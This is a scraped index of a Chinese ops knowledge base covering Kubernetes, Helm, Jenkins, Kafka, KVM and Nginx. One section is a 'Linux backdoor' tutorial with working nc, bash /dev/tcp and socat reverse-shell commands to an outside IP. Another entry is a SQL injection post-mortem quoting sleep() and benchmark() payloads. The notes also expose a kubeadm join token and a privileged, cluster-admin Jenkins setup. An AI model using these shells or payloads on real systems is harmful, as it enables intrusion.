taint nodes --all node-role.kubernetes.io/master- 禁止master部署pod kubectl taint nodes k8s node-role.kubernetes.io/master=true:NoSchedule kubectl taint nodes k8s kubernetes.io/hostname=k8s-master001 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/10、容器抓包.html":{"url":"K8S/10、容器抓包.html","title":"10、容器抓包","keywords":"","body":"tcpdump抓包 1、判断容器运行在哪个节点上 `kubctl describe pod -n mservice` 2、 登陆节点获取容器的network namespace（主机上使用netstat是看不到容器的tcp链接情况的，需要进入namespace） ```docker inspect -f nsenter --target -n``` 3、直接使用tcpdump抓包 tcpdump -i eth0 -w a.cap sniff抓包 kubectl -n test sniff website-7d7d96cdbf-6v4p6 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-22 23:37:17 "},"K8S/全链路灰度发布.html":{"url":"K8S/全链路灰度发布.html","title":"全链路灰度发布","keywords":"","body":"常用的发布类型 滚动发布 原理：假设A服务的v1版本部署了10个节点，轮询将这10个节点升级到v2版本 优点: 易实现且节约资源 缺陷：在发布期间，用户的请求可能会路由到v2版本处理，也可能会路由到v1版本处理;当版本涉及数据库等、接口字段类型等变更时将会造成客户端不可预知的错误 且回滚困难 蓝绿发布 原理： 假设A服务的V1版本部署了10个节点，需要发布v2版本时，先将v2版本也不熟10个节点，然后再统一将v1版本的所有流量路由到v2版本。蓝色发布很多时候配合流量比例使用 优点： 易实现，而且可以快速切换、回滚。提高发版速度 缺陷: 需要两倍的资源 按流量比例发布 原理：比如基于hash、会话、随机等策略使70%的流量到达v1版本，30%的流量到达v2版本 缺陷： 灰度发布(又名金丝雀发布) 原理： 通过流量随机百分比、header头、URI参数等用户属性的方式将流量平滑的在A/B版本上过渡，可以进行A/B 测试，让一部分用户使用灰度版本并逐渐放大流量 微服务全链路灰度发布系统带来的挑战 原理跟灰度发布原理一致，但是要针对整条链路实现链路灰度，比如A->B->C->D的服务调用管理中，变成A->B2->C2->D关系，有灰度版本时走灰度版本，无灰度版本的应用走正常版本 这个流量转发过程变得非常复杂 全链路灰度发布实现 场景问题 背景： 1、放问itgod.org域名时，走正常线上版本提供服务 2、当User-Agnet中包含ToGray时，走灰度版本系统服务 3、假设有4个服务分别为A/B/C/D，正常调用关系是A->B->C->D 4、应用B推出了B2版本，应用D推出了D2版本，需要进行灰度发布，并进行测试 问题1： 流量标识怎么做 用户请求中带了User-Agent: ToGray，并成功抵达了A服务，A服务在调用B服务时，B服务此时有B和B2两个版本， 应该将来自A的请求转发到B还是B2？ 问题2： 识别了流量标识怎么路由 应用之间的调用是通过域名的方式调用，在调用域名时，可能会进行URI rewrite等处理，而不是直接调用另外一个服务，如何控制路由？ 问题2： 怎么闭环 当所有流量都已经转发到灰度版本后，此时称为灰度完成。那么灰度版本替代了原来的正常版本，下次还要继续发布灰度版本时怎么办？ 问题3： 怎么自动化 整个过程包含一下4个大阶段, 整个过程复杂，且人工干预场景较多，如何自动化灰度流量? 灰度环境准备： 准备应用的灰度版本，无流量路由进入 灰度测试流量： 一般根据设置固定的Header或则URI参数来路由 灰度用户级流量： 根据用户属性或随机 进行百分比流量操控 灰度完成： 灰度版本彻底变更为线上版本，回收老版本，将此版本做为下一次灰度的老版本使用 问题4: 怎么为更复杂的版本定制流控 如何支持更多的灰度版本？比如在灰度测试流量部分，B服务同时有B2和B3多个版本 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/动态pv.html":{"url":"K8S/动态pv.html","title":"动态pv","keywords":"","body":"helm install stable/nfs-client-provisioner --set nfs.server=19fb4b48551-qxp55.cn-chengdu.nas.aliyuncs.com --set nfs.path=/dynamic_sc --name nfs-client-provisioner 设置为默认的storageclass kubectl patch storageclass nfs-client -p '{\"metadata\": {\"annotations\":{\"storageclass.kubernetes.io/is-default-class\":\"true\"}}}' kubectl get sc Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/安装Helm.html":{"url":"K8S/安装Helm.html","title":"安装Helm","keywords":"","body":"helm 安装 github 下载helm安装包 wget https://get.helm.sh/helm-v2.16.11-linux-amd64.tar.gz tar xf helm-v2.16.11-linux-amd64.tar.gz # 解压后直接把helm 复制到/usr/local/bin目录中 cp linux-amd64/helm /usr/local/bin/ # 可以查看helm版本，现在会提示无法连接到服务器tiller，因为还没有部署tiller helm version 安装tiller helm init --upgrade --tiller-image cnych/tiller:v2.14.1 安装完成后默认会在kube-system下运行一个tiller-deploy的容器 再运行helm version 查看helm 和 tiller的版本信息 为tiller创建rbac授权 cat > helm-rbrc.yml 从阿里云镜像仓库部署tiller容器 helm init --service-account=tiller --tiller-image=registry.cn-hangzhou.aliyuncs.com/google_containers/tiller:v2.16.1 --history-max 300 # 再次执行helm version 查看版本 helm version helm list 如果需要卸载tiller执行以下命令 kubectl get -n kube-system secrets,sa,clusterrolebinding -o name|grep tiller|xargs kubectl -n kube-system delete kubectl get all -n kube-system -l app=helm -o name|xargs kubectl delete -n kube-system Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:18 "},"K8S/安装jenkins.html":{"url":"K8S/安装jenkins.html","title":"安装jenkins","keywords":"","body":"pv-pvc.yml apiVersion: v1 kind: PersistentVolume metadata: name: jenkins spec: capacity: storage: 200Gi volumeMode: Filesystem accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain storageClassName: v1 nfs: path: / server: 19fb4b48551-qxp55.cn-chengdu.nas.aliyuncs.com mountOptions: - nfsvers=4.0 --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: jenkins spec: accessModes: - ReadWriteMany resources: requests: storage: 200Gi storageClassName: v1 volumeName: jenkins RBAC apiVersion: v1 kind: ServiceAccount metadata: name: jenkins-admin #ServiceAccount名 namespace: jenkins #指定namespace，一定要修改成你自己的namespace labels: name: jenkins --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: jenkins-admin labels: name: jenkins subjects: - kind: ServiceAccount name: jenkins-admin namespace: jenkins roleRef: kind: ClusterRole name: cluster-admin apiGroup: rbac.authorization.k8s.io deployment apiVersion: apps/v1 kind: Deployment metadata: name: jenkins namespace: jenkins spec: selector: matchLabels: app: jenkins replicas: 1 template: metadata: labels: app: jenkins spec: terminationGracePeriodSeconds: 10 serviceAccount: jenkins-admin containers: - name: jenkins image: jenkins/jenkins:lts imagePullPolicy: IfNotPresent securityContext: runAsUser: 0 #设置以ROOT用户运行容器 privileged: true #拥有特权 ports: - containerPort: 8080 name: web protocol: TCP - containerPort: 50000 name: agent protocol: TCP resources: limits: cpu: 1000m memory: 1Gi requests: cpu: 500m memory: 512Mi livenessProbe: httpGet: path: /login port: 8080 initialDelaySeconds: 60 timeoutSeconds: 5 failureThreshold: 12 readinessProbe: httpGet: path: /login port: 8080 initialDelaySeconds: 60 timeoutSeconds: 5 failureThreshold: 12 volumeMounts: - name: jenkinshome subPath: jenkins mountPath: /var/jenkins_home env: - name: LIMITS_MEMORY valueFrom: resourceFieldRef: resource: limits.memory divisor: 1Mi - name: JAVA_OPTS value: -Xmx$(LIMITS_MEMORY)m -XshowSettings:vm -Dhudson.slaves.NodeProvisioner.initialDelay=0 -Dhudson.slaves.NodeProvisioner.MARGIN=50 -Dhudson.slaves.NodeProvisioner.MARGIN0=0.85 -Duser.timezone=Asia/Shanghai securityContext: fsGroup: 1000 volumes: - name: jenkinshome persistentVolumeClaim: claimName: jenkins --- apiVersion: v1 kind: Service metadata: name: jenkins namespace: jenkins labels: app: jenkins spec: type: NodePort selector: app: jenkins ports: - name: web port: 8080 targetPort: web nodePort: 30000 - name: agent port: 50000 targetPort: agent 安装插件 因为网络原因需要将jenkins代理设置位置：http://jenkins访问url/pluginManager/advanced 将升级站点处的url地址修改为：http://mirror.xmission.com/jenkins/updates/current/update-center.json Kubernetes Cli Plugin：该插件可直接在Jenkins中使用kubernetes命令行进行操作。 Kubernetes plugin： 使用kubernetes则需要安装该插件 Kubernetes Continuous Deploy Plugin：kubernetes部署插件，可根据需要使用 http://jenkins访问url/updateCenter/ 查看插件安装进度 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/安装K8S.html":{"url":"K8S/安装K8S.html","title":"安装K8S","keywords":"","body":"系统初始化： 设置主机名 hostnamectl set-hostname k8s-master001 mkdir /etc/yum.repos.d/bak mv /etc/yum.repos.d/Cent* /etc/yum.repos.d/bak/ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo # 安装依赖包 yum install -y conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wgetvimnet-tools git swapoff -a && sed -i '/ swap / s/^\\(.*\\)$/#\\1/g' /etc/fstab setenforce 0 && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config cat > kubernetes.conf /etc/systemd/journald.conf.d/99-prophet.conf kubeadm 部署 docker 安装 yum install -y yum-utils device-mapper-persistent-data lvm2 ### 新增 Docker 仓库 yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo ## 安装 Docker CE. yum update && yum -y install docker-ce-18.06.2.ce ## 创建 /etc/docker 目录。 mkdir /etc/docker # 设置 daemon。 cat > /etc/docker/daemon.json 集群部署 cat /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=0 repo_gpgcheck=0 gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg EOF yum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes systemctl enable --now kubelet # 查看初始化默认配置 kubeadm config print init-defaults > kubeadm-config.yaml kubeadm init --kubernetes-version=v1.18.1 \\ --apiserver-advertise-address=172.16.5.30 \\ --image-repository registry.aliyuncs.com/google_containers \\ --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16 | tee kubeadm-init.log 节点加入集群 mkdir -p $HOME/.kube sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config # 根据提示加入 kubeadm join 172.16.5.30:6443 --token hjqed5.0ueiyniog0pzls6p \\ --discovery-token-ca-cert-hash sha256:c54d339dad7b57d7e1a2e9b5a0aded876b16a4e1eae4be1848f4d38864e804fa # 此时通过kubectl get node 状态是notready，需要安装网络插件 flannel kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml 取消污点，允许master部署pod kubectl taint nodes --all node-role.kubernetes.io/master- 禁止master部署pod kubectl taint nodes k8s node-role.kubernetes.io/master=true:NoSchedule kubectl taint nodes k8s kubernetes.io/hostname=k8s-master001 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/容器网络代理.html":{"url":"K8S/容器网络代理.html","title":"容器网络代理","keywords":"","body":"分类 Docker代理一共分为3类 Docker代理： 控制docker pull等命令的代理container代理： docker run 启动容器的时候，容器里面使用的代理服务器builder代理： docker build时的代理 配置Docker代理 mkdir -p /etc/systemd/system/docker.service.d vim sudo mkdir -p /etc/systemd/system/docker.service.d/proxy.conf # 写入以下内容 [Service] Environment=\"HTTP_PROXY=http://192.168.14.254:1080/\" Environment=\"HTTPS_PROXY=http://192.168.14.254:1080/\" Environment=\"NO_PROXY=localhost,127.0.0.1,.example.com\" # 重启 systemctl daemon-reload systemctl restart docker 配置container代理 vim ~/.docker/config.json { \"proxies\": { \"default\": { \"httpProxy\": \"http://192.168.14.254:1080/\", \"httpsProxy\": \"http://192.168.14.254:1080/\", \"noProxy\": \"localhost,127.0.0.1,.example.com\" } } } # 重启docker进程 build 代理 docker build . \\ --build-arg \"HTTP_PROXY=http://192.168.14.254:1080\" \\ --build-arg \"HTTPS_PROXY=http://192.168.14.254:1080\" \\ --build-arg \"NO_PROXY=localhost,127.0.0.1,.example.com\" \\ -t your/image:tag Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-08-15 03:46:43 "},"K8S/常用镜像库.html":{"url":"K8S/常用镜像库.html","title":"常用镜像库","keywords":"","body":"阿里云的谷歌镜像仓库地址 registry.aliyuncs.com/google_containers docker.io (docker hub公共镜像库) gcr.io (Google container registry) k8s.gcr.io (等同于 gcr.io/google-containers) quay.io (Red Hat运营的镜像库) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/网络通信.html":{"url":"K8S/网络通信.html","title":"网络通信","keywords":"","body":"pod内多个容器通信： pod内共用pause网络栈，所以可以通过lo localhost网络通信 pod间通信： overlay网络通信，google提供了cni接口，最常用的是flannel pod与service通信： 通过iptables或lvs规则转发 垮主机的pod通信： 源容器 --> docker0 --> flannel0 --> flanneld --> 容器2机器上的flanneld -->flannel0 --> docker0 --> 目标容器IP Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"K8S/零中断滚动更新.html":{"url":"K8S/零中断滚动更新.html","title":"零中断滚动更新","keywords":"","body":"面临的问题 现互联网公司开发节奏较快，线上应用迭代非常频繁，特殊情况下同一个服务甚至面临着每天(非夜间)N次发布，那么频繁发布时如何保障线上稳定性变得尤为重要 了解Pod销毁流程的意义 想要实现零中断发布，理解如何干净的关闭一个Pod中运行的应用很重要，因为在发布过程中你的应用一定会面临关闭、启动的过程 比如应用关闭的时候，你如何确保已经转发到应用中处理的请求都已经正常处理完成或者关闭了呢？ Pod销毁流程 在进行应用发布时应该怎么做 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-20 11:27:31 "},"Kafka/":{"url":"Kafka/","title":"Kafka","keywords":"","body":"1 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Kafka/Python生产消费.html":{"url":"Kafka/Python生产消费.html","title":"Python生产消费","keywords":"","body":"生产消息 安装依赖包 pip install kafka-python from kafka import KafkaProducer producer = KafkaProducer( bootstrap_servers=['192.168.14.81:9092'] ) for _ in range(100): r = producer.send('itgod', b'some_message_bytes%s') re = r.get(timeout=5) print(re) producer.close() 消费消息 from kafka import KafkaConsumer consumer = KafkaConsumer( 'dataoke2_dtk_users', bootstrap_servers='192.168.14.81:9092', group_id=\"py_for_y\" ) for message in consumer: print(\"%s:%d:%d: key=%s value=%s\" % (message.topic, message.partition, message.offset, message.key, message.value)) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Kafka/基础操作.html":{"url":"Kafka/基础操作.html","title":"基础操作","keywords":"","body":"基础操作 > 创建Topic ./kafka-topics.sh --zookeeper localhost:2181 --create --topic lfwer --partitions 10 --replication-factor 1 > 查询所有Topic ./kafka-topics.sh --zookeeper localhost:2181 --list > 生产和消费消息 ./kafka-console-producer.sh --topic lfwer --broker-list 192.168.14.81:9092 ./kafka-console-consumer.sh --topic lfwer --bootstrap-server 192.168.14.81:2181 > 查看指定group的消费状态 ./kafka-consumer-groups.sh --bootstrap-server 192.168.14.81:9092 --describe --group lfwer Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"kali/":{"url":"kali/","title":"Kali","keywords":"","body":"Kali Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"kali/扫描.html":{"url":"kali/扫描.html","title":"扫描","keywords":"","body":"fping -g 192.168.1.0/24 -a -q | tee 1host Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"KVM/":{"url":"KVM/","title":"KVM","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"KVM/在线扩容.html":{"url":"KVM/在线扩容.html","title":"在线扩容","keywords":"","body":"KVM虚拟机开机状态在线调整磁盘 查看block信息，获取到磁盘名。 cdn-logs-download为我的虚拟机名 virsh qemu-monitor-command cdn-logs-download --hmp \"info block\" 直接将磁盘调整到60G， drive-virtio-disk0是上一步中需要扩容的磁盘 virsh qemu-monitor-command cdn-logs-download --hmp \"block_resize drive-virtio-disk0 60G\" 虚拟机里磁盘扩容 curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo sed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo yum install cloud-utils-growpart.x86_64 -y growpart /dev/vda 2 pvresize /dev/vda2 vgs lvextend -L +50G /dev/mapper/centos-root xfs_growfs /dev/mapper/centos-root Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Linux/":{"url":"Linux/","title":"Linux","keywords":"","body":"Linux常用操作 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Linux/nmcli配置网络.html":{"url":"Linux/nmcli配置网络.html","title":"nmcli配置网络","keywords":"","body":"查看网卡信息 ```nmcli connection NAME UUID TYPE DEVICE ens33 a92fa07b-9b68-4d2b-a2e7-e55146099b1b ethernet ens33 ens36 418da202-9a8c-b73c-e8a1-397e00f3c6b2 ethernet ens36 nmcli con xxx ``` 显示具体的网络接口信息 nmcli connection show xxx 显示所有活动连接 nmcli connection show --active 删除一个网卡连接 nmcli connection delete xxx 给xxx添加一个IP（IPADDR） nmcli connection modify xxx ipv4.addresses 192.168.0.58 给xxx添加一个子网掩码（NETMASK） nmcli connection modify xxx ipv4.addresses 192.168.0.58/24 IP获取方式设置成手动（BOOTPROTO=static/none） nmcli connection modify xxx ipv4.method manual 添加一个ipv4 nmcli connection modify xxx +ipv4.addresses 192.168.0.59/24 删除一个ipv4 nmcli connection modify xxx -ipv4.addresses 192.168.0.59/24 添加DNS nmcli connection modify xxx ipv4.dns 114.114.114.114 删除DNS nmcli connection modify xxx -ipv4.dns 114.114.114.114 添加一个网关（GATEWAY） nmcli connection modify xxx ipv4.gateway 192.168.0.2 可一块写入： nmcli connection modify xxx ipv4.dns 114.114.114.114 ipv4.gateway 192.168.0.2 使用nmcli重新回载网络配置 nmcli c reload 如果之前没有xxx的connection，则上一步reload后就已经自动生效了 nmcli c up xxx Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"LInux后门/":{"url":"LInux后门/","title":"LInux后门","keywords":"","body":"Linux后门权限维持 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"LInux后门/shell反弹.html":{"url":"LInux后门/shell反弹.html","title":"shell反弹","keywords":"","body":"nc反弹 安装原生版本的nc wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz tar xf netcat-0.7.1.tar.gz cd netcat-0.7.1 # 执行编译需要gcc环境 ./configure --prefix=/usr/local/ncat make -j 2 && make install ln -s /usr/local/ncat/bin/nc /usr/bin/nc 场景一：被攻击机和攻击机在同一个网络中时 被攻击机开启监听，并将bash发布出去 nc -lvvp 8080 -t -e /bin/bash 攻击机上直接连接目标主机的8080端口 nc 192.168.31.41 8080 场景二：被攻击机和攻击机在不同网络中时，比如被攻击机身处内网没有公网IP 攻击机上开启8080监听, 等待shell反弹 nc -lvvp 8080 被攻击机上使用一句话反弹shell bash -i >& /dev/tcp/211.149.240.203/8080 0>&1 此时攻击机上已经接受到了shell，攻击机上执行ip add命令验证ip socat 反弹shell socket cat，基于socket，可以看做是ncat的加强版 socat命令下载链接，下载后直接放置/usr/local/bin目录即可使用 https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 肉鸡没有公网IP的情况 反弹shell 1、攻击机上开启监听 socat TCP-LISTEN:5555 - 2、被攻击机机上运行socat反弹shell(表示将shell反弹到192.168.1.101的12345端口) socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.101:5555 3、攻击机上已经获取到shell，可以直接iP add等命令查看 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Lua/":{"url":"Lua/","title":"Lua","keywords":"","body":"Lua Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Lua/1.执行阶段.html":{"url":"Lua/1.执行阶段.html","title":"1.执行阶段","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:19 "},"Mysql/":{"url":"Mysql/","title":"Mysql","keywords":"","body":"Mysql Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-28 03:23:46 "},"Mysql/一次被SQL注入的经历.html":{"url":"Mysql/一次被SQL注入的经历.html","title":"一次被SQL注入的经历","keywords":"","body":"现象 数据库的CPU负载高，导致大量会话堆积，从而引发线上查询缓慢 排查问题 1、优先恢复业务原则，立刻对MySQL进行了扩容。扩容后恢复正常 2、开始溯源，分析故障时间段内的慢SQL、每个客户端的会话链接情况、较慢SQL执行次数和sql样本等。发现账号名为nginx_proxy的用户在执行如下sql select sleep(30)-- fgkl' OR second_domain = 'a.com';select sleep(30)-- fgkl' OR one_key_domain = 'a.com';select sleep(30)-- fgkl' LIMIT 1 3、select sleep指令比较经典的用于探测SQL注入的测试命令 4、已知客户端IP和账号，定位到客户端为一台nginx服务器里面嵌入的Lua脚本，Lua脚本里执行了如下图的查库操作，并没有使用ORM框架，而是通过提取http host拼接的sql local cms_domain = http_host local sql = string.format(\"SELECT cms_domain,uid FROM dtk_user_config WHERE cms_domain='%s' OR second_domain = '%s' LIMIT 1\", cms_domain, cms_domain) 尝试复现问题 成功注入，并执行了压测 原理： 假设Host为a.com or 9576=benchmark(30000,md5(0x41536f79))-- sss时，拼接出的sql是select uid from table where cms_domain='a.com or 9576=benchmark(30000,md5(0x41536f79))-- sss' 这是无法执行的，而图中通过写入一个单引号，然后再最后添加-- 注释，使string.fotmat中的引号失效，所以拼接出sql是select uid from table where cms_domain='a.com' or 9576=benchmark(30000,md5(0x41536f79))实现了注入 修复 1、改用ORM查库 2、加入通过正则对host进行过滤后合法后再提交查询 local domainok, err = ngx_re_match(http_host,\"^(?=^.{3,255}$)[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\\\\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+$\",\"jo\") if not domainok then ngx_say(\"非法已记录\") return end 总结 这是一个低级的错误导致的SQL注入问题，现在框架中已经基本屏蔽了这些问题，这是使用字符直接拼接的sql，所以爆发了这个sql注入 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-28 03:23:46 "},"Nginx/":{"url":"Nginx/","title":"Nginx","keywords":"","body":"Nginx 调优 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:20 "},"Nginx/1.Nginx安全策略.html":{"url":"Nginx/1.Nginx安全策略.html","title":"1.Nginx安全策略","keywords":"","body":"优化链接参数 优化前 优化后 参数说明 worker_processes 1; worker_processes auto; 进程数 worker_connections 1024; worker_connections 65535; 每个进程允许的最多链接 安全策略优化 禁止空主机头访问 禁止IP直接访问，防止非法域名直接解析到IP上 # 禁止使用IP直接访问，返回403错误码 server { listen 80 default; server_name _; return 403; } #server_name处定义允许访问的域名，将80端口的http请求转发到https server { listen 80; server_name www.itgod.org itgod.org; rewrite ^(.*)$ https://$host$1 permanent; 禁止目录浏览 在Http中配置autoindex off;关闭目录浏览 http { include mime.types; default_type application/octet-stream; server_tokens off; include vhost/*.conf; #添加这行 autoindex off; 防盗链配置 只允许referer为空或者referer为信任站点时才能拉取图片 允许referer为空是为了允许浏览器直接访问图片路径 伪造referer很容易，所以此方法只能防止一般的盗链 location ~*\\.(gif|jpg|png|swf|flv|bmp)$ { valid_referers none blocked *.itgod.org itgod.org; if ($invalid_referer) { return 403; } } 隐藏Nginx版本号 屏蔽Nginx版本号，减低被版本漏洞攻击风险，在HTTP下添加一行内容 server_tokens off; 例： http { include mime.types; default_type application/octet-stream; server_tokens off; 封禁指定的url 恶意攻击通常会尝试通过URL执行一些命令，有必要禁用包含一些特殊字符串的链接访问，比如URL中包含.sh old bak sql等关键词，直接进行URL访问限制 location ~*\\.(sh|git|bak|sql|old)$ { return 403; } 系统内核参数优化 vim /etc/sysctl.conf net.ipv4.tcp_max_tw_buckets = 6000 net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_syncookies = 1 一个Nginx主配置文件示例 以下不包含图片缓存等配置，可以根据自身业务需求再合理添加图片等缓存、日志格式化等 # #user www www; user root root; worker_processes auto; #Specifies the value for maximum file descriptors that can be opened by this process. pcre_jit on; worker_rlimit_nofile 66600; worker_shutdown_timeout 60s; worker_cpu_affinity auto; events { use epoll; worker_connections 66600; } stream { proxy_connect_timeout 3s; include conf.d/tcp/*.conf; } http { error_log /var/log/nginx/error.log; access_log /var/log/nginx/access.log; charset utf-8; include mime.types; default_type application/octet-stream; #proxy_temp_path /var/log/nginx/nginx_cache/proxy_cache/proxy_temp_dir; #proxy_cache_path /var/log/nginx/nginx_cache/proxy_cache/proxy_dir levels=1:2 keys_zone=cache_one:200m inactive=1d max_size=2g; #proxy_cache_use_stale error timeout invalid_header updating http_500 http_502 http_503 http_504 http_404; log_format json '{\"access_time\": \"$time_iso8601\", \"remote_addr\": \"$remote_addr\", \"x-forward-for\": \"$http_x_forwarded_for\", \"method\": \"$request_method\", \"request_url_path\": \"$uri\", \"request_url\": \"$request_uri\", \"status\": $status, \"request_time\": $request_time, \"request_length\": \"$request_length\", \"upstream_host\": \"$upstream_http_host\", \"upstream_response_length\": \"$upstream_response_length\", \"upstream_response_time\": \"$upstream_response_time\", \"upstream_status\": \"$upstream_status\", \"http_referer\": \"$http_referer\", \"remote_user\": \"$remote_user\", \"http_user_agent\": \"$http_user_agent\", \"appkey\": \"$arg_appkey\", \"upstream_addr\": \"$upstream_addr\", \"http_host\": \"$http_host\", \"pro\": \"$scheme\", \"request_id\": \"$request_id\", \"h\": \"$host\"}'; sendfile on; tcp_nopush on; tcp_nodelay on; proxy_next_upstream error http_502 timeout; proxy_next_upstream_tries 2; open_file_cache max=10240 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 1; reset_timedout_connection on; keepalive_timeout 45s; keepalive_requests 2000; client_header_timeout 15s; client_body_timeout 15s; proxy_connect_timeout 5s; variables_hash_max_size 1024; server_tokens off; proxy_intercept_errors on; fastcgi_intercept_errors on; client_header_buffer_size 16k; large_client_header_buffers 4 32k; client_max_body_size 160m; server_names_hash_max_size 1024; server_names_hash_bucket_size 256; gzip on; gzip_min_length 1k; gzip_buffers 16 8k; gzip_comp_level 6; gzip_types text/plain text/css application/x-javascript text/xml application/xml application/xml+rss text/javascript application/json application/javascript; gzip_vary on; gzip_proxied any; proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传递请求，而不缓冲到磁盘 client_body_buffer_size 256k; proxy_buffer_size 64k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 64k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置 proxy_buffering on; geo $whiteIpList { default 1; 59.110.139.118 0; } map $whiteIpList $binary_remote_addr_limit { 1 $binary_remote_addr; 0 \"\"; } limit_req_zone $http_host zone=open_api_domain:50m rate=2500r/s; limit_req_zone $arg_appkey zone=open_api_appkey:50m rate=200r/s; limit_req_zone $binary_remote_addr zone=zone_web_tmp:50m rate=5r/s; limit_req_zone $binary_remote_addr zone=zone_web:50m rate=50r/s; limit_req_zone $binary_remote_addr zone=zone_web_yjtg:50m rate=30r/s; limit_req_zone $binary_remote_addr_limit zone=zone_open_api:50m rate=40r/s; map $sent_http_cdn_time $expires { default -1; ~^\\d+$ $sent_http_cdn_time; } more_clear_headers Pragma; set_real_ip_from 0.0.0.0/0; real_ip_header X-Forwarded-For; real_ip_recursive on; expires $expires; more_set_headers \"Upstream-Name2: $proxy_host\"; lua_package_path \"${prefix}conf/conf.d/lrc4/?.lua;/opt/nginx/lua_modules/?.lua;/opt/nginx/lua/?.lua;/opt/nginx/lua_modules/?.lua;/opt/nginx/lua/?.lua;;\"; lua_shared_dict domain_mem 10m; lua_shared_dict open_url_mem_min 10m; lua_shared_dict open_appkey_mem_day 10m; lua_shared_dict my_limit_req_store 30m; lua_shared_dict my_limit_req_api 30m; lua_shared_dict cms_domain_mem 10m; lua_shared_dict cms_domain_vipstatus_mem 2m; lua_shared_dict openapiv2_rediskey_mem 50m; lua_socket_log_errors off; # TCP发送失败的时候，会发送error日志到error.log,此过程会有性能开销，建议关闭，避免健康检查中多台机器down了，导致日志一直写入error.log。对于异常的情况请使用ngx.log来记录 lua_shared_dict healthcheck 2m; # 存放upstream servers的共享内存，upstream组越多，配置就越大。 proxy_redirect off ; proxy_http_version 1.1; proxy_set_header Connection \"\"; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Request-Id $request_id; proxy_set_header x-b3-traceid $request_id; resolver 100.100.2.138 100.100.2.136 valid=30s; # 静态化varnish缓存，轮训负载均衡主备 split_clients \"$request_uri\" $proxy_cache { 50% master_cache_servers; * backup_cache_servers; } limit_req_status 429; ssl_certificate 